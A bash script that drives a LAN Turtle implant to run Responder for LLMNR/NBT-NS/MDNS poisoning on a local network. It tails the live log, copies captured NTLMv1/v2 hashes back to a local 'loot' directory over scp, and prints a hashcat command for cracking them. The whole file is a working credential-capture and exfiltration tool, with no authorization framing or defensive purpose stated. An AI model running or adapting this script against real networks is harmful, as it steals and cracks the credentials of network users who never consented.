#!/usr/bin/env bash
# ==================================================================
#  responder-lan-turtle.sh
#  Description : SSH into a LAN Turtle, launch Responder for LLMNR/
#                NBT-NS/MDNS poisoning, tail the live log, then pull
#                captured hashes back to the loot directory.
#  Requires    : ssh, scp, Responder installed on LAN Turtle
#  Usage       : ./responder-lan-turtle.sh [turtle_ip] [interface] [duration_s]
#  Defaults    : 172.16.84.1  eth0  300
#  Example     : ./responder-lan-turtle.sh 172.16.84.1 eth0 600
# ==================================================================

set -euo pipefail

TURTLE_IP="${1:-172.16.84.1}"
IFACE="${2:-eth0}"
DURATION="${3:-300}"
TURTLE_USER="root"
LOOT_DIR="./loot/responder-$(date +%Y%m%d_%H%M%S)"
mkdir -p "$LOOT_DIR"

echo " =================================================="
echo "  Responder via LAN Turtle"
echo "  Turtle IP  : $TURTLE_IP"
echo "  Interface  : $IFACE"
echo "  Duration   : ${DURATION}s"
echo "  Loot Dir   : $LOOT_DIR"
echo " =================================================="

# Verify SSH connectivity
if ! ssh -o ConnectTimeout=5 -o BatchMode=yes "${TURTLE_USER}@${TURTLE_IP}" true 2>/dev/null; then
    echo "[!] Cannot reach LAN Turtle at ${TURTLE_IP}. Check connection and SSH key."
    exit 1
fi
echo "[*] LAN Turtle reachable."

# Detect Responder location on device
RESPONDER_PATH=$(ssh "${TURTLE_USER}@${TURTLE_IP}" \
    "command -v Responder.py 2>/dev/null || \
     find /root /opt /usr/local -name 'Responder.py' 2>/dev/null | head -1" 2>/dev/null || true)

if [[ -z "$RESPONDER_PATH" ]]; then
    echo "[!] Responder.py not found on LAN Turtle."
    echo "    Install: opkg install python3; pip3 install impacket; git clone https://github.com/lgandx/Responder"
    exit 1
fi
echo "[*] Responder found at: $RESPONDER_PATH"

RESPONDER_DIR=$(dirname "$RESPONDER_PATH")

# Kill any existing Responder instance
ssh "${TURTLE_USER}@${TURTLE_IP}" "pkill -f Responder.py 2>/dev/null || true" 2>/dev/null

# Launch Responder in background on the Turtle
echo "[*] Launching Responder on ${IFACE} for ${DURATION}s..."
ssh "${TURTLE_USER}@${TURTLE_IP}" "nohup python3 ${RESPONDER_PATH} \
    -I ${IFACE} \
    -wrf \
    -v \
    > /tmp/responder_live.log 2>&1 &
    echo \$!" > "${LOOT_DIR}/responder_pid.txt"

REMOTE_PID=$(cat "${LOOT_DIR}/responder_pid.txt" 2>/dev/null | tail -1 || echo "unknown")
echo "[*] Responder PID on turtle: $REMOTE_PID"

# Tail live output for DURATION seconds
echo "[*] Tailing live Responder output (${DURATION}s)..."
echo "[*] Press Ctrl+C to stop early — loot will still be pulled."
echo ""

timeout "${DURATION}" ssh "${TURTLE_USER}@${TURTLE_IP}" \
    "tail -f /tmp/responder_live.log" 2>/dev/null | \
    tee "${LOOT_DIR}/responder_live.log" || true

echo ""
echo "[*] Duration elapsed. Stopping Responder..."
ssh "${TURTLE_USER}@${TURTLE_IP}" "pkill -f Responder.py 2>/dev/null || true" 2>/dev/null
sleep 2

# Pull captured hashes and logs
echo "[*] Pulling loot from LAN Turtle..."

# Responder logs directory
for remote_path in \
    "${RESPONDER_DIR}/logs" \
    "/root/Responder/logs" \
    "/opt/Responder/logs"; do
    EXISTS=$(ssh "${TURTLE_USER}@${TURTLE_IP}" "test -d ${remote_path} && echo yes || echo no" 2>/dev/null)
    if [[ "$EXISTS" == "yes" ]]; then
        scp -r "${TURTLE_USER}@${TURTLE_IP}:${remote_path}/" "${LOOT_DIR}/responder-logs/" 2>/dev/null && break
    fi
done

# Also pull the live log
scp "${TURTLE_USER}@${TURTLE_IP}:/tmp/responder_live.log" \
    "${LOOT_DIR}/responder_full.log" 2>/dev/null || true

# Summarize captured hashes
echo ""
echo "[+] Captured hashes (NTLMv1/v2/Net-NTLMv2):"
if find "${LOOT_DIR}" -name "*.txt" 2>/dev/null | xargs grep -l "NTLMv" 2>/dev/null | head -5; then
    find "${LOOT_DIR}" -name "*NTLM*" -o -name "*NTLMv2*" 2>/dev/null | while read -r f; do
        echo ""
        echo "  --- $f ---"
        cat "$f"
    done
else
    grep -h "NTLMv\|SMBv2\|HTTP NTLMv" "${LOOT_DIR}/responder_full.log" 2>/dev/null | \
        sort -u | head -20 || echo "  (no hashes captured)"
fi

echo ""
echo "[+] Loot directory: $LOOT_DIR"
echo "[+] To crack with hashcat:"
echo "    hashcat -m 5600 ${LOOT_DIR}/responder-logs/*NTLMv2*.txt /path/to/wordlist.txt"
